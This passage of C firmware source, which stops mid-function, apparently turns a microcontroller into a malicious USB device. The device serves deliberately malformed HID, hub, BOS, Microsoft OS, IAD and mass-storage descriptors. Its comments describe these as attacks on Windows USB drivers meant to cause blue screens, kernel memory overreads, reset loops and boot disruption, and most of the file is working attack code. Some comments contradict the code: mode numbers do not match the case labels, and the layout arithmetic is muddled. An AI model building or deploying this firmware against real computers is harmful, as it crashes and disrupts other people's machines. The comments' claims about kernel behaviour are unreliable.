/**
 * usbd_fuzzer.c — Custom USB class with full descriptor control
 *
 * Key design: GetFSCfgDesc() is OUR function, not usbd_hid.c's hardcoded
 * version. All FUZZ_MODE manipulations in the config descriptor actually
 * reach the host OS.
 *
 * Fuzzing is applied at the raw byte level so the host receives the
 * malformed data exactly as written, bypassing all HAL sanity checks.
 */

#include "usbd_fuzzer.h"
#include "usbd_desc.h"
#include "usbd_ctlreq.h"
#include "usbd_ioreq.h"
#include "usbd_core.h"
#include "main.h"

/* Runtime mode and sequencer state — defined in main.c */
extern uint8_t  g_active_fuzz_mode;
extern uint8_t  g_auto_seq_mode;
extern void     Fuzzer_RandomPatch(uint8_t *desc, uint16_t len);

/* -----------------------------------------------------------------------
 * Minimal HID report descriptor — 4-byte generic input report
 * Host needs a valid report descriptor to complete enumeration before
 * we can exercise the fuzz target (config descriptor is parsed first).
 * ----------------------------------------------------------------------- */
/* Mode 15: Multi-vector HID Report Descriptor attack against hidparse.sys.
 *
 * Vector 0 — Underflow: 4× END_COLLECTION before any COLLECTION is opened.
 *             hidparse nesting counter underflows (0→underflow), corrupting
 *             internal state before the main descriptor is even parsed.
 * Vector 1 — PUSH bomb: 8× PUSH (0xA4) without POP overflows the hidparse
 *             internal global-state stack.
 * Vector 2 — Nested COLLECTION bomb: 8 unclosed Logical collections.
 * Vector 3 — REPORT_COUNT=255 × REPORT_SIZE=255 = 65025 bits ≈ 8128 bytes
 *             per report → huge non-paged-pool alloc in hidclass.sys.
 * Vector 4 — Long Item: 0xFE prefix claims bDataSize=255 but descriptor
 *             ends here → hidparse reads 255 bytes past the buffer end. */
static const uint8_t FUZZER_ReportDesc_Fuzz[] = {
    /* Vector 0: spurious END_COLLECTIONs before any COLLECTION → nesting underflow */
    0xC0, 0xC0, 0xC0, 0xC0,
    /* Minimal valid header to advance the parser */
    0x05, 0x01,              /* USAGE_PAGE (Generic Desktop) */
    0x09, 0x06,              /* USAGE (Keyboard) */
    0xA1, 0x01,              /* COLLECTION (Application) — unclosed */
    /* Vector 1: PUSH bomb */
    0xA4, 0xA4, 0xA4, 0xA4,
    0xA4, 0xA4, 0xA4, 0xA4,
    /* Vector 2: nested COLLECTION bomb */
    0xA1, 0x02, 0xA1, 0x02,
    0xA1, 0x02, 0xA1, 0x02,
    0xA1, 0x02, 0xA1, 0x02,
    0xA1, 0x02, 0xA1, 0x02,
    /* Vector 3: extreme report size */
    0x75, 0xFF,              /* REPORT_SIZE (255) */
    0x95, 0xFF,              /* REPORT_COUNT (255) */
    0x15, 0x00,              /* LOGICAL_MINIMUM (0) */
    0x25, 0xFF,              /* LOGICAL_MAXIMUM (255) */
    0x09, 0x30,              /* USAGE (X) */
    0x81, 0x02,              /* INPUT (Data, Var, Abs) */
    /* Vector 4: Long Item claiming 255 bytes → overread */
    0xFE, 0xFF, 0x04,
};

/* Mode 9: Hub class descriptor — bNbrPorts=255, bLength=71 (correct for 255 ports),
 * but only 9 bytes are transmitted.  usbhub.sys reads DeviceRemovable and
 * PortPwrCtrlMask bitmaps that should each be 32 bytes but the buffer only
 * holds 1 byte each → usbhub reads 31 bytes past the descriptor into adjacent
 * kernel pool memory. */
static const uint8_t FUZZER_HubDesc[] = {
    71,                /* bLength = 71 (= 7 + 2*ceil(255/8) — correct for 255 ports) */
    0x29,              /* bDescriptorType = Hub */
    255,               /* bNbrPorts = 255 */
    0x89, 0x00,        /* wHubCharacteristics: compound device, per-port overcurrent */
    0x32,              /* bPwrOn2PwrGood = 50 (100ms) */
    0xC8,              /* bHubContrCurrent = 200mA */
    0x00,              /* DeviceRemovable[0] — should be 32 bytes, only 1 provided */
    0xFF,              /* PortPwrCtrlMask[0] — should be 32 bytes, only 1 provided */
};

/* Mode 10: BOS descriptor for fake USB 3.0 device.
 * wTotalLength=85 but only 45 bytes transmitted.  4th capability claims
 * bLength=255, so the BOS parser tries to skip 255 bytes to find the next
 * capability, overshooting the buffer by 252 bytes. */
static const uint8_t FUZZER_BosDesc[] = {
    0x05, 0x0F,        /* bLength=5, bDescriptorType=BOS */
    0x55, 0x00,        /* wTotalLength=85 — claims 80 bytes of capabilities */
    0x04,              /* bNumDeviceCaps=4 */
    /* Capability 1: USB 2.0 Extension (7 bytes) */
    0x07, 0x10, 0x02, 0x02, 0x00, 0x00, 0x00,
    /* Capability 2: SuperSpeed Device Capability (10 bytes) */
    0x0A, 0x10, 0x03, 0x00, 0x0E, 0x00, 0x01, 0x00, 0x07, 0x00,
    /* Capability 3: Container ID (20 bytes) */
    0x14, 0x10, 0x04, 0x00,
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    /* Capability 4: bLength=255 — parser advances 255 bytes → 252-byte overread */
    0xFF, 0x10, 0x05,
};

/* Mode 23: Large config descriptor (128 bytes) — first 34 bytes valid, rest 0xFF.
 * Windows requests up to wLength bytes; after we send all 128 we STALL the EP0
 * status phase.  usbport.sys marks the control transfer as failed and retries —
 * but the next attempt gets the same stall, creating a reset loop. */
static uint8_t FUZZER_LargeDesc[128] = {
    /* Valid config header (34 bytes) */
    0x09, USB_DESC_TYPE_CONFIGURATION, 0x80, 0x00, /* wTotalLength=128 */
    0x01, 0x01, 0x00, 0xC0, 0x32,
    0x09, USB_DESC_TYPE_INTERFACE, 0x00, 0x00, 0x01, 0x03, 0x00, 0x00, 0x00,
    0x09, 0x21, 0x11, 0x01, 0x00, 0x01, 0x22, 26, 0x00,
    0x07, USB_DESC_TYPE_ENDPOINT, 0x81, 0x03, 0x08, 0x00, 0x0A,
    /* Padding 94 bytes → 0xFF → host reads garbage as additional descriptors */
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
};

static uint8_t g_ep0_stall_armed = 0;

/* Mode 24: Microsoft OS String Descriptor (index 0xEE).
 * Windows sends GET_DESCRIPTOR(String, 0xEE) on first connection.
 * If we respond with a valid MSFT100 string + our bVendorCode,
 * Windows follows up with a vendor GET_MS_DESCRIPTOR request.
 * We respond with Extended Compat ID wTotalLength=0xFFFF → Windows
 * allocates a 65535-byte kernel buffer and reads past end of our data. */
static const uint8_t FUZZER_OsStringDesc[] = {
    0x12,           /* bLength = 18 */
    0x03,           /* bDescriptorType = String */
    'M',0,'S',0,'F',0,'T',0,'1',0,'0',0,'0',0,  /* qwSignature = "MSFT100" UTF-16LE */
    0x02,           /* bMS_VendorCode = 0x02 (our bRequest for follow-up) */
    0x00,           /* bPad */
};

/* Extended Compat ID — header + 1 function record.
 * dwLength=0xFFFF tells Windows the payload is 65535 bytes;
 * we only send 40 bytes.  Windows' IRP buffer read runs off the end of
 * our response into uninitialized non-paged pool. */
static const uint8_t FUZZER_ExtCompatIdDesc[] = {
    /* Header (16 bytes) */
    0xFF, 0xFF, 0x00, 0x00,   /* dwLength = 0xFFFF */
    0x00, 0x01,               /* bcdVersion = 1.00 */
    0x04, 0x00,               /* wIndex = 0x0004 (Extended Compat ID) */
    0xFF,                     /* bCount = 255 function records claimed */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  /* reserved */
    /* Function record 0 (24 bytes) */
    0x00,                     /* bFirstInterfaceNumber */
    0x01,                     /* reserved */
    'W','I','N','U','S','B',0x00,0x00,   /* compatibleID = "WINUSB\0\0" */
    'A','A','A','A','A','A','A','A',     /* subCompatibleID = 8× 'A' (garbage) */
    0x00,0x00,0x00,0x00,0x00,0x00,       /* reserved */
};

/* Mode 26: IAD conflict composite config descriptor (91 bytes).
 *
 * Three IADs all claim bFirstInterface=0:
 *   IAD-A: count=2, class=HID(3)   — valid range 0-1
 *   IAD-B: count=2, class=CDC(2)   — OVERLAP with IAD-A
 *   IAD-C: count=255, class=Hub(9) — covers entire address space
 *
 * usbccgp.sys builds an interface-to-function map by walking IADs.
 * Overlapping entries corrupt the map: interfaces get assigned to
 * multiple functions simultaneously → pointer aliasing in ccgp. */
static uint8_t FUZZER_IadCfgDesc[FUZZER_IAD_CFG_DESC_SIZE] = {
    /* Config descriptor */
    0x09, USB_DESC_TYPE_CONFIGURATION,
    FUZZER_IAD_CFG_DESC_SIZE, 0x00, /* wTotalLength */
    0x04,           /* bNumInterfaces = 4 */
    0x01, 0x00, 0xC0, 0x32,
    /* IAD-A: HID, ifaces 0-1 */
    0x08, 0x0B, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00,
    /* IAD-B: CDC, ifaces 0-1 CONFLICT */
    0x08, 0x0B, 0x00, 0x02, 0x02, 0x02, 0x01, 0x00,
    /* IAD-C: Hub, ifaces 0-255 EXTREME OVERLAP */
    0x08, 0x0B, 0x00, 0xFF, 0x09, 0x00, 0x00, 0x00,
    /* Interface 0: HID */
    0x09, USB_DESC_TYPE_INTERFACE, 0x00, 0x00, 0x01, 0x03, 0x00, 0x00, 0x00,
    /* HID descriptor */
    0x09, 0x21, 0x11, 0x01, 0x00, 0x01, 0x22, 26, 0x00,
    /* EP1 IN interrupt */
    0x07, USB_DESC_TYPE_ENDPOINT, 0x81, 0x03, 0x08, 0x00, 0x0A,
    /* Interface 1: CDC (CONFLICT — already claimed by IAD-A as HID) */
    0x09, USB_DESC_TYPE_INTERFACE, 0x01, 0x00, 0x01, 0x02, 0x02, 0x01, 0x00,
    /* EP2 IN interrupt */
    0x07, USB_DESC_TYPE_ENDPOINT, 0x82, 0x03, 0x08, 0x00, 0x10,
    /* Interface 2: duplicate of iface 0 (same bInterfaceNumber=0 CONFLICT) */
    0x09, USB_DESC_TYPE_INTERFACE, 0x00, 0x01, 0x01, 0x09, 0x00, 0x00, 0x00,
    /* EP3 IN — not opened, generates NAK → usbccgp hangs waiting */
    0x07, USB_DESC_TYPE_ENDPOINT, 0x83, 0x03, 0x08, 0x00, 0x0A,
    /* Interface 3: Hub (iface number 0 again — triple conflict) */
    0x09, USB_DESC_TYPE_INTERFACE, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
};

/* Mode 27: USB Mass Storage (BOT/SCSI) config descriptor (32 bytes).
 * bInterfaceClass=0x08, subClass=0x06 (SCSI), protocol=0x50 (BOT).
 * Windows loads usbstor.sys which sends a SCSI INQUIRY CBW.
 * We respond with a malformed CSW (wrong signature + Phase Error status).
 * usbstor resets and retries → infinite reset loop. */
static uint8_t FUZZER_MscCfgDesc[FUZZER_MSC_CFG_DESC_SIZE] = {
    0x09, USB_DESC_TYPE_CONFIGURATION, FUZZER_MSC_CFG_DESC_SIZE, 0x00,
    0x01, 0x01, 0x00, 0xC0, 0x32,
    0x09, USB_DESC_TYPE_INTERFACE, 0x00, 0x00, 0x02, 0x08, 0x06, 0x50, 0x00,
    /* EP1 OUT bulk 64 bytes */
    0x07, USB_DESC_TYPE_ENDPOINT, 0x01, 0x02, 0x40, 0x00, 0x00,
    /* EP1 IN  bulk 64 bytes */
    0x07, USB_DESC_TYPE_ENDPOINT, 0x81, 0x02, 0x40, 0x00, 0x00,
};

static uint8_t g_cbw_buf[64];   /* MSC CBW receive buffer */

/* Mode 17: Standard HID boot keyboard report descriptor (45 bytes).
 * bInterfaceProtocol=0x01 makes kbdhid.sys load.  8-byte boot report:
 * [modifier][reserved][key1..key6].  Right-Ctrl=modifier bit 4, ScrollLock=0x47. */
static const uint8_t FUZZER_KbdReportDesc[FUZZER_KBD_REPORT_DESC_SIZE] = {
    0x05, 0x01,        /* USAGE_PAGE (Generic Desktop) */
    0x09, 0x06,        /* USAGE (Keyboard) */
    0xA1, 0x01,        /* COLLECTION (Application) */
    0x05, 0x07,        /*   USAGE_PAGE (Keyboard/Keypad) */
    0x19, 0xE0,        /*   USAGE_MINIMUM (Left Ctrl) */
    0x29, 0xE7,        /*   USAGE_MAXIMUM (Right GUI) */
    0x15, 0x00,        /*   LOGICAL_MINIMUM (0) */
    0x25, 0x01,        /*   LOGICAL_MAXIMUM (1) */
    0x75, 0x01,        /*   REPORT_SIZE (1) */
    0x95, 0x08,        /*   REPORT_COUNT (8) — modifier byte */
    0x81, 0x02,        /*   INPUT (Data, Var, Abs) */
    0x95, 0x01,        /*   REPORT_COUNT (1) */
    0x75, 0x08,        /*   REPORT_SIZE (8) — reserved byte */
    0x81, 0x03,        /*   INPUT (Const, Var, Abs) */
    0x95, 0x06,        /*   REPORT_COUNT (6) — keycodes */
    0x75, 0x08,        /*   REPORT_SIZE (8) */
    0x15, 0x00,        /*   LOGICAL_MINIMUM (0) */
    0x25, 0x65,        /*   LOGICAL_MAXIMUM (101) */
    0x05, 0x07,        /*   USAGE_PAGE (Keyboard/Keypad) */
    0x19, 0x00,        /*   USAGE_MINIMUM (0) */
    0x29, 0x65,        /*   USAGE_MAXIMUM (101) */
    0x81, 0x00,        /*   INPUT (Data, Array, Abs) */
    0xC0,              /* END_COLLECTION */
};

const uint8_t FUZZER_ReportDesc[FUZZER_HID_REPORT_DESC_SIZE] = {
    0x05, 0x01,        /* USAGE_PAGE (Generic Desktop) */
    0x09, 0x00,        /* USAGE (Undefined)            */
    0xA1, 0x01,        /* COLLECTION (Application)     */
    0x09, 0x30,        /*   USAGE (X)                  */
    0x09, 0x31,        /*   USAGE (Y)                  */
    0x09, 0x32,        /*   USAGE (Z)                  */
    0x09, 0x33,        /*   USAGE (Rx)                 */
    0x15, 0x00,        /*   LOGICAL_MINIMUM (0)        */
    0x26, 0xFF, 0x00,  /*   LOGICAL_MAXIMUM (255)      */
    0x75, 0x08,        /*   REPORT_SIZE (8)            */
    0x95, 0x04,        /*   REPORT_COUNT (4)           */
    0x81, 0x02,        /*   INPUT (Data,Var,Abs)       */
    0xC0,              /* END_COLLECTION               */
};

/* -----------------------------------------------------------------------
 * Configuration descriptor with per-mode fuzzing applied at byte level
 *
 * Base layout (34 bytes total):
 *   [0-8]   Configuration descriptor (9 bytes)
 *   [9-17]  Interface descriptor    (9 bytes)
 *   [18-24] HID descriptor          (7 bytes)
 *   [25-31] Endpoint descriptor     (7 bytes) — wait, 9+9+7+7=32, padding=2
 *
 * Actual layout matching USB spec:
 *   Config  [0]:  bLength=9
 *   Config  [1]:  bDescriptorType=2
 *   Config  [2-3]:wTotalLength    ← FUZZ_MODE 1/2
 *   Config  [4]:  bNumInterfaces  ← FUZZ_MODE 5
 *   Config  [5]:  bConfigurationValue=1
 *   Config  [6]:  iConfiguration=0
 *   Config  [7]:  bmAttributes=0xC0
 *   Config  [8]:  bMaxPower=50 (100mA)
 *   Iface   [9]:  bLength=9
 *   Iface   [10]: bDescriptorType=4
 *   Iface   [11]: bInterfaceNumber=0
 *   Iface   [12]: bAlternateSetting=0
 *   Iface   [13]: bNumEndpoints=1
 *   Iface   [14]: bInterfaceClass=3 (HID)
 *   Iface   [15]: bInterfaceSubClass=0
 *   Iface   [16]: bInterfaceProtocol=0
 *   Iface   [17]: iInterface=0
 *   HID     [18]: bLength=9
 *   HID     [19]: bDescriptorType=0x21
 *   HID     [20-21]: bcdHID=0x0111
 *   HID     [22]: bCountryCode=0
 *   HID     [23]: bNumDescriptors=1
 *   HID     [24]: bDescriptorType=0x22 (Report)
 *   HID     [25-26]: wDescriptorLength=FUZZER_HID_REPORT_DESC_SIZE
 *   EP      [27]: bLength=7
 *   EP      [28]: bDescriptorType=5
 *   EP      [29]: bEndpointAddress=0x81 (IN EP1)
 *   EP      [30]: bmAttributes=3 (Interrupt)
 *   EP      [31-32]: wMaxPacketSize  ← FUZZ_MODE 4
 *   EP      [33]: bInterval=10 (10ms)
 * ----------------------------------------------------------------------- */

/* Runtime-writable so we can apply mode-specific patches in Init */
static uint8_t FUZZER_CfgDesc[FUZZER_CFG_DESC_SIZE] = {
    /* Configuration descriptor */
    0x09,                         /* [0]  bLength */
    USB_DESC_TYPE_CONFIGURATION,  /* [1]  bDescriptorType */
    FUZZER_CFG_DESC_SIZE, 0x00,  /* [2-3] wTotalLength — patched below */
    0x01,                         /* [4]  bNumInterfaces — patched for mode 5 */
    0x01,                         /* [5]  bConfigurationValue */
    0x00,                         /* [6]  iConfiguration */
    0xC0,                         /* [7]  bmAttributes (self-powered) */
    0x32,                         /* [8]  bMaxPower (100mA) */
    /* Interface descriptor */
    0x09,                         /* [9]  bLength */
    USB_DESC_TYPE_INTERFACE,      /* [10] bDescriptorType */
    0x00,                         /* [11] bInterfaceNumber */
    0x00,                         /* [12] bAlternateSetting */
    0x01,                         /* [13] bNumEndpoints */
    0x03,                         /* [14] bInterfaceClass (HID) */
    HID_SUBCLASS_NONE,            /* [15] bInterfaceSubClass */
    HID_PROTOCOL_NONE,            /* [16] bInterfaceProtocol */
    0x00,                         /* [17] iInterface */
    /* HID descriptor */
    0x09,                         /* [18] bLength */
    0x21,                         /* [19] bDescriptorType (HID) */
    0x11, 0x01,                   /* [20-21] bcdHID 1.11 */
    0x00,                         /* [22] bCountryCode */
    0x01,                         /* [23] bNumDescriptors */
    0x22,                         /* [24] bDescriptorType (Report) */
    FUZZER_HID_REPORT_DESC_SIZE, 0x00, /* [25-26] wDescriptorLength */
    /* Endpoint descriptor */
    0x07,                         /* [27] bLength */
    USB_DESC_TYPE_ENDPOINT,       /* [28] bDescriptorType */
    FUZZER_EPIN_ADDR,             /* [29] bEndpointAddress */
    0x03,                         /* [30] bmAttributes (Interrupt) */
    FUZZER_EPIN_SIZE, 0x00,       /* [31-32] wMaxPacketSize — patched for mode 4 */
    0x0A,                         /* [33] bInterval (10ms) */
};

/* Baseline values for the mutable descriptor fields — used for reset in Mode 8 */
static const uint8_t FUZZER_CfgDesc_Baseline[FUZZER_CFG_DESC_SIZE] = {
    0x09, USB_DESC_TYPE_CONFIGURATION, FUZZER_CFG_DESC_SIZE, 0x00,
    0x01, 0x01, 0x00, 0xC0, 0x32,
    0x09, USB_DESC_TYPE_INTERFACE, 0x00, 0x00, 0x01, 0x03,
    HID_SUBCLASS_NONE, HID_PROTOCOL_NONE, 0x00,
    0x09, 0x21, 0x11, 0x01, 0x00, 0x01, 0x22,
    FUZZER_HID_REPORT_DESC_SIZE, 0x00,
    0x07, USB_DESC_TYPE_ENDPOINT, FUZZER_EPIN_ADDR, 0x03,
    FUZZER_EPIN_SIZE, 0x00, 0x0A,
};

static void ResetCfgDescToBaseline(void)
{
    for (uint16_t i = 0; i < FUZZER_CFG_DESC_SIZE; i++) {
        FUZZER_CfgDesc[i] = FUZZER_CfgDesc_Baseline[i];
    }
}

/* Applied once per Init/DeInit cycle */
static uint8_t g_desc_patched = 0;

/* Mode 25: descriptor morph phase (0=HID, 1=Hub, 2=random) */
uint8_t g_morph_phase = 0;

static void ApplyFuzzPatches(void)
{
    if (g_desc_patched) return;
    g_desc_patched = 1;

    /* Sequencers reset baseline so patches don't bleed between steps. */
    if (g_active_fuzz_mode == FUZZ_MODE_AUTO_SEQUENCE  ||
        g_active_fuzz_mode == FUZZ_MODE_BOOT_DISRUPT   ||
        g_active_fuzz_mode == FUZZ_MODE_RAPID_SEQ) {
        ResetCfgDescToBaseline();
    }

    /* Determine effective mode: sequencers delegate to g_auto_seq_mode */
    uint8_t eff = (g_active_fuzz_mode == FUZZ_MODE_AUTO_SEQUENCE ||
                   g_active_fuzz_mode == FUZZ_MODE_BOOT_DISRUPT   ||
                   g_active_fuzz_mode == FUZZ_MODE_RAPID_SEQ)
                  ? g_auto_seq_mode : g_active_fuzz_mode;

    switch (eff) {
    /* ---- Group 1: Device Descriptor (patched in usbd_desc.c) ---- */
    case FUZZ_MODE_HUB_IMPERSONATE:   /* 1 */
    case FUZZ_MODE_BCDUSB_30:         /* 2 */
    case FUZZ_MODE_NUMCONFIG_ZERO:    /* 3 */
        break;
    case FUZZ_MODE_ENDPOINT_MAXPACKET: /* 4 */
        /* wMaxPacketSize=255 (FS interrupt max=64) */
        FUZZER_CfgDesc[31] = 0xFF;
        FUZZER_CfgDesc[32] = 0x00;
        break;

    /* ---- Group 2: Config / Interface / Endpoint ---- */
    case FUZZ_MODE_WTOTALLENGTH_SMALL: /* 5 */
        FUZZER_CfgDesc[2] = 0x05;
        FUZZER_CfgDesc[3] = 0x00;
        break;
    case FUZZ_MODE_WTOTALLENGTH_LARGE: /* 6 */
        /* wTotalLength=0xFFFF: Windows allocates 65535-byte buffer, receives 34.
         * Remaining bytes come from uninitialized kernel pool. */
        FUZZER_CfgDesc[2] = 0xFF;
        FUZZER_CfgDesc[3] = 0xFF;
        break;
    case FUZZ_MODE_NUMINTERFACES_OVER: /* 7 */
        FUZZER_CfgDesc[4] = 0x10;
        break;
    case FUZZ_MODE_NUMEP_ZERO:         /* 8 */
        FUZZER_CfgDesc[13] = 0x00;
        break;
    case FUZZ_MODE_BMATTR_ZERO:        /* 9 */
        /* bmAttributes=0 (bit7 mandatory) + interface bLength=0 → parser loop
         * + bInterval=0 (invalid for interrupt EP) */
        FUZZER_CfgDesc[7]  = 0x00;
        FUZZER_CfgDesc[9]  = 0x00;
        FUZZER_CfgDesc[33] = 0x00;
        break;

    /* ---- Group 3: String (patched in usbd_desc.c) ---- */
    case FUZZ_MODE_STRING_BLEN_OVERFLOW: /* 10 */
        break;

    /* ---- Group 4: HID ---- */
    case FUZZ_MODE_HID_DESCLEN_MAX:    /* 11 */
        FUZZER_CfgDesc[25] = 0xFF;
        FUZZER_CfgDesc[26] = 0xFF;
        break;
    case FUZZ_MODE_HID_BCDVER:         /* 12 */
        /* wTotalLength=65535 + HID bLength=54 + bNumDescriptors=16 */
        FUZZER_CfgDesc[2]  = 0xFF; FUZZER_CfgDesc[3]  = 0xFF;
        FUZZER_CfgDesc[18] = 0x36;
        FUZZER_CfgDesc[20] = 0x00; FUZZER_CfgDesc[21] = 0x03;
        FUZZER_CfgDesc[23] = 0x10;
        break;
    case FUZZ_MODE_HID_REPORT_FUZZ:    /* 13 */
        FUZZER_CfgDesc[25] = (uint8_t)sizeof(FUZZER_ReportDesc_Fuzz);
        FUZZER_CfgDesc[26] = 0x00;
        break;

    /* ---- Group 5: Special ---- */
    case FUZZ_MODE_RECONNECT_LOOP:     /* 14 */
        /* Serve malformed HID desc so hidparse is mid-parse on disconnect → UAF */
        FUZZER_CfgDesc[25] = (uint8_t)sizeof(FUZZER_ReportDesc_Fuzz);
        FUZZER_CfgDesc[26] = 0x00;
        break;
    case FUZZ_MODE_RANDOM:             /* 15 */
        Fuzzer_RandomPatch(FUZZER_CfgDesc, FUZZER_CFG_DESC_SIZE);
        break;

    /* ---- Group 6: Keyboard BSOD ---- */
    case FUZZ_MODE_KBD_CRASH:          /* 17 */
        /* Enumerate as a proper HID boot keyboard so kbdhid.sys loads */
        FUZZER_CfgDesc[16] = HID_PROTOCOL_KEYBOARD;
        FUZZER_CfgDesc[25] = FUZZER_KBD_REPORT_DESC_SIZE;
        FUZZER_CfgDesc[26] = 0x00;
        break;

    /* ---- Group 7: BIOS POST / Boot disruption ---- */
    case FUZZ_MODE_POST_RECONNECT:     /* 18 — timing only, no descriptor change */
        break;
    case FUZZ_MODE_NUMCONFIG_FLOOD:    /* 19 — bNumConfigs=254 in DevDesc + wTotal=0xFFFF */
        FUZZER_CfgDesc[2] = 0xFF;
        FUZZER_CfgDesc[3] = 0xFF;
        break;
    case FUZZ_MODE_LANGID_BOMB:        /* 20 — handled in usbd_desc.c */
        break;
    case FUZZ_MODE_DEVQUAL_BOMB:       /* 21 — DevDesc + GetDeviceQualifierDesc */
        break;
    case FUZZ_MODE_BOOT_DISRUPT:       /* 22 — sequencer, never reaches here (eff unwraps) */
        break;

    /* ---- Group 8: EP0 / Protocol attacks ---- */
    case FUZZ_MODE_EP0_STALL_MID:      /* 23 — arm stall flag; fired in EP0_TxSent */
        g_ep0_stall_armed = 1;
        break;
    case FUZZ_MODE_MS_OS_DESC:         /* 24 — handled in Setup (vendor request) */
        break;
    case FUZZ_MODE_DESC_MORPH:         /* 25 — handled in GetFSCfgDesc */
        break;

    /* ---- Group 9: Composite / Class attacks ---- */
    case FUZZ_MODE_IAD_CONFLICT:       /* 26 — config descriptor in GetFSCfgDesc */
        break;
    case FUZZ_MODE_MSC_SCSI_BOMB:      /* 27 — bulk endpoints opened in Init */
        break;

    /* ---- Group 10: Flood / Rapid-fire / Combo ---- */
    case FUZZ_MODE_HID_FLOOD:          /* 28 — kbd config same as Mode 17 */
        FUZZER_CfgDesc[16] = HID_PROTOCOL_KEYBOARD;
        FUZZER_CfgDesc[25] = FUZZER_KBD_REPORT_DESC_SIZE;
        FUZZER_CfgDesc[26] = 0x00;
        break;
    case FUZZ_MODE_RAPID_SEQ:          /* 29 — sequencer, never reaches here */
        break;
    case FUZZ_MODE_OMNI_BOMB:          /* 30 — all patches at once */
        /* Config descriptor bombs */
        FUZZER_CfgDesc[2]  = 0xFF; FUZZER_CfgDesc[3]  = 0xFF; /* wTotalLength=0xFFFF */
        FUZZER_CfgDesc[4]  = 0x10;                              /* bNumInterfaces=16 */
        FUZZER_CfgDesc[7]  = 0x00;                              /* bmAttributes=0 */
        FUZZER_CfgDesc[9]  = 0x00;                              /* iface bLength=0 */
        FUZZER_CfgDesc[13] = 0x00;                              /* bNumEndpoints=0 lie */
        FUZZER_CfgDesc[18] = 0x36;                              /* HID bLength=54 */
        FUZZER_CfgDesc[20] = 0x00; FUZZER_CfgDesc[21] = 0x03;  /* bcdHID=3.00 */
        FUZZER_CfgDesc[23] = 0x10;                              /* bNumDescriptors=16 */
        FUZZER_CfgDesc[25] = 0xFF; FUZZER_CfgDesc[26] = 0xFF;  /* wDescLen=0xFFFF */
        FUZZER_CfgDesc[31] = 0xFF; FUZZER_CfgDesc[32] = 0x00;  /* wMaxPacketSize=255 */
        FUZZER_CfgDesc[33] = 0x00;                              /* bInterval=0 */
        g_ep0_stall_armed  = 1;                                 /* stall on first EP0 TxSent */
        break;

    default:
        break;
    }
}

/* -----------------------------------------------------------------------
 * USBD_ClassTypeDef callbacks
 * ----------------------------------------------------------------------- */

static uint8_t USBD_FUZZER_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
    (void)cfgidx;
    ApplyFuzzPatches();
    if (g_active_fuzz_mode == FUZZ_MODE_MSC_SCSI_BOMB) {
        USBD_LL_OpenEP(pdev, FUZZER_EPOUT_ADDR, USBD_EP_TYPE_BULK, FUZZER_BULK_SIZE);
        USBD_LL_OpenEP(pdev, FUZZER_EPIN_ADDR,  USBD_EP_TYPE_BULK, FUZZER_BULK_SIZE);
        pdev->ep_out[FUZZER_EPOUT_ADDR & 0x0FU].is_used = 1U;
        pdev->ep_in [FUZZER_EPIN_ADDR  & 0x0FU].is_used = 1U;
        USBD_LL_PrepareReceive(pdev, FUZZER_EPOUT_ADDR, g_cbw_buf, FUZZER_BULK_SIZE);
    } else {
        USBD_LL_OpenEP(pdev, FUZZER_EPIN_ADDR, USBD_EP_TYPE_INTR, FUZZER_EPIN_SIZE);
        pdev->ep_in[FUZZER_EPIN_ADDR & 0x0FU].is_used = 1U;
    }
    return USBD_OK;
}

static uint8_t USBD_FUZZER_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
    (void)cfgidx;
    if (g_active_fuzz_mode == FUZZ_MODE_MSC_SCSI_BOMB) {
        USBD_LL_CloseEP(pdev, FUZZER_EPOUT_ADDR);
        USBD_LL_CloseEP(pdev, FUZZER_EPIN_ADDR);
        pdev->ep_out[FUZZER_EPOUT_ADDR & 0x0FU].is_used = 0U;
        pdev->ep_in [FUZZER_EPIN_ADDR  & 0x0FU].is_used = 0U;
    } else {
        USBD_LL_CloseEP(pdev, FUZZER_EPIN_ADDR);
        pdev->ep_in[FUZZER_EPIN_ADDR & 0x0FU].is_used = 0U;
    }
    g_desc_patched    = 0;
    g_ep0_stall_armed = 0;
    return USBD_OK;
}

static uint8_t USBD_FUZZER_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
    uint16_t len = 0;
    const uint8_t *pbuf = NULL;

    switch (req->bmRequest & USB_REQ_TYPE_MASK) {

    /* Mode 24: Microsoft OS Descriptor vendor request (bRequest=0x02, wIndex=0x0004).
     * Windows sends this after receiving our MSFT100 OS String at index 0xEE.
     * We return Extended Compat ID with dwLength=0xFFFF — Windows allocates
     * a 65535-byte kernel buffer and reads far past our 40-byte response. */
    case USB_REQ_TYPE_VENDOR:
        if (g_active_fuzz_mode == FUZZ_MODE_MS_OS_DESC && req->bRequest == 0x02U) {
            if (req->wIndex == 0x0004U) {
                len  = MIN((uint16_t)sizeof(FUZZER_ExtCompatIdDesc), req->wLength);
                pbuf = FUZZER_ExtCompatIdDesc;
                USBD_CtlSendData(pdev, (uint8_t *)pbuf, len);
            } else {
                USBD_CtlError(pdev, req);
                return USBD_FAIL;
            }
        } else {
            USBD_CtlError(pdev, req);
            return USBD_FAIL;
        }
        break;

    case USB_REQ_TYPE_CLASS:
        switch (req->bRequest) {
        case 0x0A: /* SET_IDLE — accept silently */
            break;
        case 0x09: /* SET_REPORT — accept, ignore data */
